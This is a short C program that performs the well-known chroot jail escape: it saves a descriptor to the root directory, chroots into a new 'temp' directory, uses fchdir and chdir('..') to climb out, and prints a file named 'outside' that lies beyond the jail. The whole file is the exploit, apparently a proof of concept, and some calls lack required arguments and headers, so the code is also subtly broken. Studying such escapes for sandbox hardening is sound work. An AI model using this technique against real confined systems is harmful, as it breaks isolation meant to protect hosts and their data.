#include <unistd.h>
#include <stdio.h>
#include <errno.h>


int main() {
	mkdir("temp");
	int pointer = open("/");
	chroot("temp");
	fchdir(pointer);
	chdir("..");
	

	int c;
	FILE *file;
	file = fopen("outside", "r");
	if (file) {
		while ((c = getc(file)) != EOF)
			putchar(c);
		fclose(file);
	}
	else {
		printf("Failed");
	}
	return 0;
}
